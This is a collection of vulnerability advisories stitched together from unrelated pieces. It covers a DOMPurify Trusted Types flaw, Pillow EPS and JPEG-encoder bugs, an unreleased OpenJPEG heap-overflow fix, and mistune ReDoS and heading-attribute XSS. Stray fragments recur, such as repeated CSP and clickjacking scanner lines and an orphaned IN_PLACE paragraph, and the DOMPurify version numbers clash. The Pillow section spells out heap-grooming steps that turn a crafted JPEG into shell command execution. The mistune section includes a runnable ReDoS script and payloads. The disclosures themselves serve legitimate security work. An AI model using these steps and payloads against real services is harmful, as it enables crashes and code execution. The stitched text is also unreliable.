message: dompurify 3.3.1: CVE-2026-65899 — DOMPurify: Trusted Types policy survives `clearConfig()` and can poison later `RETURN_TRUSTED_TYPE` output
description: ## Impact A DOMPurify instance that is reused across trust boundaries can stay bound to a previously supplied `TRUSTED_TYPES_POLICY` even after `clearConfig()` is called. A later caller that requests `RETURN_TRUSTED_TYPE` receives a `TrustedHTML` object created by the old policy, not by a clean default configuration. If the old policy is unsafe or controlled by a less-trusted integration, this turns a later "default" sanitize call into script execution at a Trusted Types sink. `TRUSTED_TYPES_POLICY: null` on the later call also does not clear the retained policy. [dompurify-trusted-types-policy-survives-clearconfig-poc.js](https://github.com/user-attachments/files/28604913/dompurify-trusted-types-policy-survives-clearconfig-poc.js) ## Affected version Tested against DOMPurify `3.4.8`, repository commit `825e617753ac1169306a542d3174a77f717a0cf6`. ## Root cause `_parseConfig()` overwrites `trustedTypesPolicy` when `cfg.TRUSTED_TYPES_POLICY` is truthy, but the default/null path only initializes the internal policy when `trustedTypesPolicy === undefined`. Once a custom policy has been set, later default config parsing leaves it in place. Relevant code: - `src/purify.ts:786-812` accepts and stores `cfg.TRUSTED_TYPES_POLICY`. - `src/purify.ts:813-832` does not reset an existing policy when config has no policy or has `TRUSTED_TYPES_POLICY: null`. - `src/purify.ts:2123-2125` signs the final serialized HTML with the retained policy when `RETURN_TRUSTED_TYPE` is true. - `src/purify.ts:2133-2136` `clearConfig()` only clears `CONFIG` and `SET_CONFIG`; it does not reset `trustedTypesPolicy` or `emptyHTML`. ## Local PoC Run from the DOMPurify checkout, or set `DOMPURIFY_REPO`: ```bash node /home/dompurify-trusted-types-policy-survives-clearconfig-poc.js ``` Observed output: ```json { "result": { "baseline": "baseline", "duringPolicy": "", "afterClearString": "", "afterClearTrustedType": "[object TrustedHTML]", "afterClearTrusted": "", "afterNullTrusted": "", "mountedHTML": "" }, "dialogs": [ "TT_POLICY_SURVIVED_CLEARCONFIG" ] } ``` The important part is the split behavior after cleanup: - `purify.clearConfig(); purify.sanitize(...);` returns a normal sanitized string (``), because the later call is not asking for a Trusted Type. - `purify.clearConfig(); purify.sanitize(..., { RETURN_TRUSTED_TYPE: true });` still uses the old policy and returns attacker-controlled `TrustedHTML`. - Passing `{ TRUSTED_TYPES_POLICY: null, RETURN_TRUSTED_TYPE: true }` also still returns attacker-controlled `TrustedHTML`. ## Preconditions This is a shared-instance state contamination issue. It matters when one DOMPurify instance is reused by multiple integrations, plugins, request handlers, or components with different trust levels, and a cleanup step relies on `clearConfig()` to restore safe defaults. This is not a default string-input bypass. An attacker must be able to influence a prior `TRUSTED_TYPES_POLICY` on the reused instance, or a less-trusted integration must have installed an unsafe policy. ## Severity impact is XSS at a Trusted Types sink in applications that reuse a DOMPurify instance across trust boundaries. Attack complexity is high because exploitation depends on prior policy injection or a less-trusted integration and a later `RETURN_TRUSTED_TYPE` sink. ## Suggested fix Make `clearConfig()` reset Trusted Types state as part of restoring defaults, or have `_parseConfig()` explicitly clear `trustedTypesPolicy` and `emptyHTML` when `TRUSTED_TYPES_POLICY: null` is supplied.

Moving the returned node via `appendChild` alone does not trigger it. Applications that pass **live, connected attacker trees** into `IN_PLACE` are explicitly warned against by upstream's own source comment; this report concerns the serialize-and-reinsert consumption pattern that the IN_PLACE mode exists to serve.

CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
The site is only served under HTTP and not HTTPS.

CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
The site is only served under HTTP and not HTTPS.
The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.

message: pillow 12.2.0: CVE-2026-59203 — Pillow EpsImagePlugin negative %%BeginBinary byte count causes infinite loop denial of service
description: Pillow is a Python imaging library. From 12.0.0 through 12.2.0, Pillow's EPS parser in PIL/EpsImagePlugin.py accepts a negative byte count in the %%BeginBinary directive, allowing a crafted EPS file to cause Image.open() to seek backwards to the same directive and parse it repeatedly in an infinite loop. This issue is fixed in version 12.3.0.

``` ============================================================================ Heap buffer overflow writing JPEG comment after ICC profile fills buffer Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.  The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.  Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., "JPEG", icc_profile=im.info.get("icc_profile"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.  The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.  The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.  ## Details  `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.  A JPEG laid out as  ``` FFD8                                   SOI FFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"] FFFE <len> <comment, any length 1..65533>           -> im.info["comment"] <any baseline RGB JPEG body> ```  opened with `Image.open()` and re-saved with the usual colour-profile-preserving call  ```python im.save(out, "JPEG", icc_profile=im.info.get("icc_profile")) ```  kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.  ### Code path  The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:  ```python # src/PIL/JpegImagePlugin.py:859-862     else:         # The EXIF info needs to be written as one block, + APP1, + one spare byte.         # Ensure that our buffer is big enough. Same with the icc_profile block.         bufsize = max(len(exif) + 5, len(extra) + 1) ```  `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).  The "+1 spare byte" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(&cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:  ```c // src/libImaging/JpegEncode.c:302-337         case 3:             if (context->extra) {                 unsigned int n = context->extra_size - context->extra_offset;                 if (n > context->destination.pub.free_in_buffer) {                     n = context->destination.pub.free_in_buffer;                 }                 memcpy(context->destination.pub.next_output_byte, context->extra + context->extra_offset, n);                 context->destination.pub.next_output_byte += n;                 context->destination.pub.free_in_buffer -= n;                 context->extra_offset += n;                 if (context->extra_offset >= context->extra_size) {                     state->state++;                 // done -> fall into case 4, even with free_in_buffer == 0                 } else {                     break;                 }             } …          case 4:             if (context->comment) {                 jpeg_write_marker(&context->cinfo, JPEG_COM,                                   (unsigned char *)context->comment, context->comment_size);   // :330 — no space check             }             state->state++;          case 5:             if (1024 > context->destination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64                 break;             }             … jpeg_write_scanlines(…) … ```  Every other emitting state is guarded — state 2 requires `rawExifLen + 5 <= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.  With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is  ```c /* jcmarker.c */   *(dest->next_output_byte)++ = (JOCTET)val;   if (--dest->free_in_buffer == 0) { if (!(*dest->empty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); } ```  i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(&buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.  All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info["icc_profile"]` (`:238-241`) and stores the COM payload in `im.info["comment"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get("comment", im.info.get("comment"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info["icc_profile"]` and a `tEXt` chunk keyed `comment` becomes `im.info["comment"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert("RGB") → save("JPEG", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `"Created with GIMP"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.  ### What lies behind the buffer  The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo->main->process_data`) read from bytes the file supplied.  ## Impact  Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get("icc_profile")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.  It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context->comment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.  ## Reproducing  `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.  The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.  Each file goes through the same application code in a child `python3 -X faulthandler` process:  ```python im = Image.open(BytesIO(data)) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) ```  1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless. 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info["comment"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.  Expected output: the control prints `save returned normally` and `-> exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-> exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.  ## Suggested fix  The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:  ```diff --- a/src/libImaging/JpegEncode.c +++ b/src/libImaging/JpegEncode.c @@ -327,6 +327,11 @@          case 4:                if (context->comment) { +                // check for comment len + 'COM' header bytes +                if (context->comment_size + 5 > +                    context->destination.pub.free_in_buffer) { +                    break; +                }                  jpeg_write_marker( ```  The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b""`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.  The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError("Comment is too long")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.  Independently, the "+ 1 spare byte" / "+ 5" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. ### Summary  Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219  Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.  I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.  Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.  ### Details  ## Affected wheels  From `.github/dependencies.json` (`openjpeg`) at each tag:  | Pillow | bundled OpenJPEG | status | |---|---|---| | 10.4.0 | 2.5.2 | safe | | 11.0.0 | 2.5.2 | safe | | **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** | | **12.0.0 … 12.3.0** | **2.5.4** | **affected** |  Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.  ## The defect  `src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:  ```c OPJ_UINT32 l_current_tile_part =     l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =     l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2; ```  `tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.  The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.  Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.  ## Patch status  Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).  The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.  ## Suggested remediation  1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file. 2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code. 3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.  ## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply  `Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.  I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.  That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.  ### Proof of concept  ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:  ``` ==766332==ERROR: AddressSanitizer: heap-buffer-overflow WRITE of size 8     #0 opj_j2k_read_sod          j2k.c:5086     #1 opj_j2k_read_tile_header  j2k.c:9912     #2 opj_read_tile_header      openjpeg.c:575     #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793     #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949     #5 _decode                   src/decode.c:132 located 8 bytes to the right of a 24-byte region allocated by     opj_j2k_build_tp_index_from_tlm j2k.c:8939 ```  Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.  I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.  No disclosure deadline from me; I will not publish anything while this is being worked on.  ### Impact  Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.  **Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.  **Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):  ``` rip  0x4000    <- value chosen by the attacker's file layout rsi  0x3ff2    <- m_error_data, written by the same walk ```  Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.  To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

### Summary  A ReDoS (Regular Expression Denial of Service) vulnerability in `LINK_TITLE_RE` allows an attacker who can supply Markdown for parsing to cause denial of service. A crafted 58-byte Markdown document blocks the parser for approximately 6 seconds (measured on Apple M2, Python 3.14.3), with exponential growth per additional byte pair.  ### Details  The vulnerable regex is defined in [`src/mistune/helpers.py#L20-L25`](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L20-L25):  ```python LINK_TITLE_RE = re.compile(     r"[ \t\n]+("     r'"(?:\\' + PUNCTUATION + r'|[^"\x00])*"|'  # "title"     r"'(?:\\" + PUNCTUATION + r"|[^'\x00])*'"   # 'title'     r")" ) ```  The double-quote branch compiles to `"(?:\\[PUNCTUATION]|[^"\x00])*"`. The two alternatives inside `(A|B)*` overlap: a backslash followed by a punctuation character (e.g. `\!`) can be matched by **either** branch — as a 2-character escaped-punctuation sequence `\\!`, or as two individual `[^"\x00]` characters (`\` then `!`). The same ambiguity exists in the single-quoted title branch.  When the input contains repeated `\!` pairs with no closing `"`, the regex engine exhaustively backtracks through all 2^N combinations, resulting in **exponential O(2^N) time complexity**.  This is reachable through normal Markdown parsing via two code paths: 1. **Inline links**: `[text](url "PAYLOAD)` → [`parse_link()`](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L178) → [`parse_link_title()`](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L169) 2. **Block link reference definitions**: `[label]: url "PAYLOAD` → [`BlockParser.parse_ref_link()`](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/block_parser.py#L220) → [`parse_link_title()`](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L169) at [block_parser.py#L259](https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/block_parser.py#L259)  ### PoC  ```python import mistune import time  md = mistune.create_markdown()  # Test with increasing N (number of \! pairs) for n in [15, 18, 20, 22, 25]:     payload = '[x](y "' + '\\!' * n + ')'     start = time.time()     md(payload)     elapsed = time.time() - start     print(f"N={n:2d}  len={len(payload):3d} bytes  time={elapsed:.3f}s") ```  Output (Apple M2, Python 3.14.3, mistune 3.2.0):  ``` N=15  len= 38 bytes  time=0.007s N=18  len= 44 bytes  time=0.044s N=20  len= 48 bytes  time=0.178s N=22  len= 52 bytes  time=0.740s N=25  len= 58 bytes  time=5.922s ```  Each increment of N roughly doubles the execution time (consistent with O(2^N)).  The same attack works via block link reference definitions:  ```python payload = '[l]: u "' + '\\!' * 25  # 58 bytes, ~6 seconds md(payload) ```  ### Impact  This is a denial of service vulnerability. Any application or service that parses user-supplied Markdown using mistune can be made unresponsive by an attacker submitting a small crafted input (under 100 bytes).  Affected use cases include: - Web applications with Markdown-enabled input fields (comments, posts, descriptions) - Documentation systems that accept user contributions - API endpoints that process Markdown - Jupyter tooling such as nbconvert that relies on mistune for rendering  ### Suggested Fix  Exclude the backslash character from the catch-all character class to eliminate the alternation overlap:  ```python # Before (vulnerable): r'"(?:\\' + PUNCTUATION + r'|[^"\x00])*"' r"'(?:\\" + PUNCTUATION + r"|[^'\x00])*'"  # After (fixed): r'"(?:\\' + PUNCTUATION + r'|[^"\\\x00])*"' r"'(?:\\" + PUNCTUATION + r"|[^'\\\x00])*'" ```  This ensures a backslash can only be consumed by the escaped-punctuation branch, eliminating the ambiguity in both the double-quote and single-quote branches. Verified on mistune 3.2.0 (Apple M2, Python 3.14.3): - Reduces N=25 from 4.2 seconds to 0.000006 seconds (700,000x improvement) - Handles N=50 in 0.000008 seconds - Passes all existing functional tests (quoted titles, escaped quotes, escaped punctuation)

## Summary `HTMLRenderer.heading()` builds the opening `` tag by string-concatenating the `id` attribute value directly into the HTML — with no call to `escape()`, `safe_entity()`, or any other sanitisation function. A double-quote character `"` in the `id` value terminates the attribute, allowing an attacker to inject arbitrary additional attributes (event handlers, `src=`, `href=`, etc.) into the heading element. The default TOC hook assigns safe auto-incremented IDs (`toc_1`, `toc_2`, …) that never contain user text. However, the `add_toc_hook()` API accepts a caller-supplied `heading_id` callback. Deriving heading IDs from the heading text itself — to produce human-readable slug anchors like `#installation` or `#getting-started` — is by far the most common real-world usage of this callback (every major documentation generator does this). When the callback returns raw heading text, an attacker who controls heading content can break out of the `id=` attribute. ## Details **File:** `src/mistune/renderers/html.py` ```python def heading(self, text: str, level: int, **attrs: Any) -> str: tag = "h" + str(level) html = "<" + tag _id = attrs.get("id") if _id: html += ' id="' + _id + '"' # ← _id is never escaped return html + ">" + text + " " ``` The `text` body (line content) *is* escaped upstream by the inline token 